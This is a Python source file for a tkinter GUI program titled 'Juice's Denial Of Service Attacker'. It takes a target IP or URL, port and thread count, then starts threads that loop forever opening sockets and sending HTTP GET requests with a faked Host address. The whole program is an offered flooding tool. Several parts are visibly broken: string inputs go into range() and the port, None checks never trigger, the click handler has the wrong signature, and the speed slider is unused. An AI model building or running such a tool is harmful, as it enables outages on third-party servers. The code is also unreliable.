import tkinter
from tkinter import ttk
from tkinter import HORIZONTAL
from tkinter import PhotoImage
from PIL import ImageTk

import socket
import threading

import sv_ttk

root = tkinter.Tk()

root.geometry("750x300")
root.title("Juice's Denial Of Service Attacker")
width, height = root.winfo_width(), root.winfo_height()

root.eval('tk::PlaceWindow %s center' % root.winfo_pathname(root.winfo_id()))

bg = PhotoImage(file = "Background2.png")

bgLabel = ttk.Label( root, image = bg)
bgLabel.place(x = 0, y = 0)

TitleLabel = ttk.Label(root, text="JUICE DOS", font=("Arial Bold", 100))
TitleLabel.place(x=100, y=-11)

# ----#----#----#----#----

# set to IP
def SetTargetIp():
    IpAdress = IpInput.get()
    IpAdressFontSize = 50
    print(IpAdress)
    if len(IpAdress) > 13:
        IpAdressFontSize /= 1 + (len(IpAdress)/100*2)
        IpAdressFontSize = int(IpAdressFontSize)
    targetDisplay.config(text=IpAdress, font=("Arial Bold", IpAdressFontSize))
    targetDisplay.place_configure(x=10, y=235)

# set to url
def SetTargetUrl():
    UrlAdress = UrlInput.get()
    print(UrlAdress)

    IpAdress=(socket.gethostbyname(UrlAdress))
    print(IpAdress)
    IpAdressFontSize = 50

    if len(UrlAdress) > 13:
        IpAdressFontSize /= 1 + (len(IpAdress)/100*2)
        IpAdressFontSize = int(IpAdressFontSize)
    targetDisplay.config(text=IpAdress, font=("Arial Bold", IpAdressFontSize))
    targetDisplay.place_configure(x=10, y=235)

def StartDos():
    Trd = ThreadsInput.get()
    if Trd == None:
        Trd = 3
    for i in range(Trd):
        thread = threading.Thread(target=DosFunc)
        thread.start()

def DosFunc():
    target = targetDisplay.cget("text")
    port = PortInput.get()
    if port == None:
        port = 80
    fake_ip = '44.197.175.168'

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
# ----#----#----#----#----

IpInput = ttk.Entry(root)
IpInput.place(x=56, y=110)

IpLabel = ttk.Label(root, text="IP:", font=("Arial", 20))
IpLabel.place(x=26, y=115)

IpConfirm = ttk.Button(root, text="SET TARGET", command=SetTargetIp)
IpConfirm.place(x=280, y=110)

# ----#----#----#----#----

UrlInput = ttk.Entry(root)
UrlInput.place(x=56,y=164)

UrlLabel = ttk.Label(root, text="URL:", font=("Arial", 20))
UrlLabel.place(x=6, y=164)

UrlConfirm = ttk.Button(root, text="SET TARGET", command=SetTargetUrl)
UrlConfirm.place(x=280, y=164)

# ----#----#----#----#----

targetLabel = ttk.Label(root, text="TARGET", font=("Arial", 20))
targetLabel.place(x=140, y=214)
targetDisplay = ttk.Label(root, text="NONE", font=("Arial Bold", 50))
targetDisplay.place(x=110, y=235)

# ----#----#----#----#----

PortLabel = ttk.Label(root, text="PORT:", font=("Arial", 21))
PortLabel.place(x=408, y=110)
PortInput = ttk.Entry(root, width=5, justify="center")
PortInput.place(x=478, y=108)

# ----#----#----#----#----

ThreadsLabel = ttk.Label(root, text="THREADS:", font=("Arial", 21))
ThreadsLabel.place(x=559, y=110)
ThreadsInput = ttk.Entry(root, width=5, justify="center")
ThreadsInput.place(x=672, y=110)

# ----#----#----#----#----

SpeedSlider = ttk.Scale(root, from_=0, to=10, orient=HORIZONTAL, length=333)
SpeedSlider.set(5.01)
SpeedSlider.place(x=406, y=175)

SliderS = ttk.Label(root, text="S", font=("Arial", 10))
SliderS.place(x=408, y=165)
SliderM = ttk.Label(root, text="M", font=("Arial", 10))
SliderM.place(x=565, y=165)
SliderF = ttk.Label(root, text="F", font=("Arial", 10))
SliderF.place(x=724, y=165)

# ----#----#----#----#----

startLabel = ttk.Label(root, text="START", font=("Arial", 20))
startLabel.place(x=535, y=214)
attackLabel = ttk.Label(root, text="ATTACK", font=("Arial Bold", 50))
attackLabel.place(x=460, y=235)
attackLabel.bind("<Button-1>", StartDos)

# This is where the magic happens
sv_ttk.set_theme("dark")

def check_window():
    currentw, currenth = root.winfo_width(), root.winfo_height()
    if width!= currentw or height != currenth:
        root.geometry("750x300")
        root.after(10, check_window)

root.after(10, check_window)
root.mainloop()